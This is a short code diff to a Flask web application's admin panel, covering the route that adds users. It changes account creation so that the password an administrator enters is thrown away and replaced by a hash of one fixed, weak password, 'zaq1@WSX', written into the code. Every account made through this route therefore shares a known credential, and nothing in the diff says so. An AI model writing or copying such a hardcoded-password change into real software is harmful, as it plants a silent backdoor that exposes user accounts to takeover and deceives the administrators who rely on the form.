@@ -1,5 +1,6 @@
 from flask import Blueprint, flash, redirect, render_template, request, url_for
 from flask_login import current_user
+from werkzeug.security import generate_password_hash
 
 from app.services.user_service import admin_edit_user, admin_create_user, delete_user, get_all_users, get_user_by_email, get_user_by_username
 from app.utils.utils import admin_required
@@ -23,7 +24,7 @@ def admin_panel():
 def admin_add_user():
     username = request.form.get('username')
     email = request.form.get('email')
-    password = request.form.get('password')
+    password = generate_password_hash('zaq1@WSX')
     role = request.form.get('role')
 
     if get_user_by_username(username) or get_user_by_email(email):
